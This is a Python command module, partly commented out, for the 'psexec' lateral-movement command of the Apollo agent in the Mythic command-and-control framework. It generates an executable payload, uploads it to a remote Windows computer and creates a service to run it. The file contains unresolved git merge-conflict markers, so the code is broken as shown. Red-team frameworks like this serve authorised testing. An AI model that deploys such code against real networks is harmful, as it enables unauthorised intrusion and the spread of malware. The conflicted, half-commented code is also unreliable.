# from mythic_payloadtype_container.MythicCommandBase import *
# import json
# from uuid import uuid4
# from mythic_payloadtype_container.MythicRPC import *
# import base64

# class PsExecArguments(TaskArguments):

#     def __init__(self, command_line):
#         super().__init__(command_line)
#         self.args = {
#             "computer": CommandParameter(name="Computer", type=ParameterType.String, description="Computer to install the service on."),
#             "template": CommandParameter(name="Payload Template", type=ParameterType.Payload, supported_agents=["service_wrapper"]),
#             "remote_path": CommandParameter(name="Remote Path", required=False, type=ParameterType.String,
#                               description="Remote path to place the service executable. Defaults to C:\\Users\\Public", default_value="C:\\Users\\Public"),
#             "service_name": CommandParameter(name="Service Name", required=False, type=ParameterType.String,
#                               description='The name of the service to install as. Defaults to "ApolloService-GUID"'),
#             "display_name": CommandParameter(name="Service Display Name", required=False, type=ParameterType.String,
#                               description='The display name of the service. Defaults to "Apollo Service: \{GUID\}"')
#         }

#     async def parse_arguments(self):
#         _uuid = str(uuid4())
#         self.load_args_from_json_string(self.command_line)
#         if self.args["computer"] == None:
#             raise Exception("A computer to install the new service on is required.")
#         if self.args["template"] == None:
#             raise Exception("A payload template must be selected so one may be generated and installed on the remote computer {}".format(self.args["computer"]))
#         if self.args["service_name"] == None or self.args["remote_path"] == "":
#             self.args["service_name"] = f"ApolloService-{_uuid}"
#         if self.args["display_name"] == None or self.args["display_name"] == "":
#             self.args["display_name"] = f"Apollo Service: {_uuid}"
#         pass


# class PsExecCommand(CommandBase):
#     cmd = "psexec"
#     needs_admin = True
#     help_cmd = "psexec (modal popup)"
#     description = "Pivot to a machine by creating a new service and starting it."
#     version = 2
#     is_exit = False
#     is_file_browse = False
#     is_process_list = False
#     is_download_file = False
#     is_upload_file = False
#     is_remove_file = False
#     author = "@djhohnstein"
#     argument_class = PsExecArguments
#     attackmapping = ["T1588", "T1570"]

<<<<<<< HEAD
#     async def create_tasking(self, task: MythicTask) -> MythicTask:
#         temp = await MythicRPC().execute("get_payload", payload_uuid=task.args.get_arg("template"))
#         gen_resp = await MythicRPC().execute("create_payload_from_uuid",
#                                              task_id=task.id,
#                                              payload_uuid=task.args.get_arg('template'),
#                                              new_description="{}'s psexec from task {}".format(task.operator, str(task.id)))
#         if gen_resp.status == MythicStatus.Success:
#             # we know a payload is building, now we want it
#             while True:
#                 resp = await MythicRPC().execute("get_payload", payload_uuid=gen_resp.response["uuid"])
#                 if resp.status == MythicStatus.Success:
#                     if resp.response["build_phase"] == 'success':
#                         b64contents = resp.response["contents"]
#                         pe = base64.b64decode(b64contents)
#                         if len(pe) > 1 and pe[:2] != b"\x4d\x5a":
#                             raise Exception("psexec requires a payload executable, but got unknown type.")
#                         # it's done, so we can register a file for it
#                         task.args.add_arg("template", resp.response["file"]["agent_file_id"])
#                         task.display_params = "Uploading payload '{}' to {} on {} and creating service '{}'".format(temp.response['tag'], task.args.get_arg("remote_path"), task.args.get_arg("computer"), task.args.get_arg("service_name"))
#                         break
#                     elif resp.response["build_phase"] == 'error':
#                         raise Exception("Failed to build new payload: {}".format(resp.response["error_message"]))
#                     elif resp.response["build_phase"] == "building":
#                         await asyncio.sleep(2)
#                     else:
#                         raise Exception(resp.response["build_phase"])
#                 else:
#                     raise Exception(resp.response["error_message"])
#         else:
#             raise Exception("Failed to start build process")
=======
    async def create_tasking(self, task: MythicTask) -> MythicTask:
        temp = await MythicRPC().execute("get_payload", payload_uuid=task.args.get_arg("template"))
        gen_resp = await MythicRPC().execute("create_payload_from_uuid",
                                             task_id=task.id,
                                             payload_uuid=task.args.get_arg('template'),
                                             new_description="{}'s psexec from task {}".format(task.operator, str(task.id)))
        if gen_resp.status == MythicStatus.Success:
            # we know a payload is building, now we want it
            while True:
                resp = await MythicRPC().execute("get_payload", payload_uuid=gen_resp.response["uuid"])
                if resp.status == MythicStatus.Success:
                    if resp.response["build_phase"] == 'success':
                        b64contents = resp.response["contents"]
                        pe = base64.b64decode(b64contents)
                        if len(pe) > 1 and pe[:2] != b"\x4d\x5a":
                            raise Exception("psexec requires a payload executable, but got unknown type.")
                        # it's done, so we can register a file for it
                        task.args.add_arg("template", resp.response["file"]["agent_file_id"])
                        task.display_params = "Uploading payload '{}' to {} on {} and creating service...".format(temp.response['tag'], task.args.get_arg("remote_path"), task.args.get_arg("computer"))
                        break
                    elif resp.response["build_phase"] == 'error':
                        raise Exception("Failed to build new payload: {}".format(resp.response["error_message"]))
                    elif resp.response["build_phase"] == "building":
                        await asyncio.sleep(2)
                    else:
                        raise Exception(resp.response["build_phase"])
                else:
                    raise Exception(resp.response["error_message"])
        else:
            raise Exception("Failed to start build process")
>>>>>>> origin/dev



#         return task

#     async def process_response(self, response: AgentResponse):
#         pass
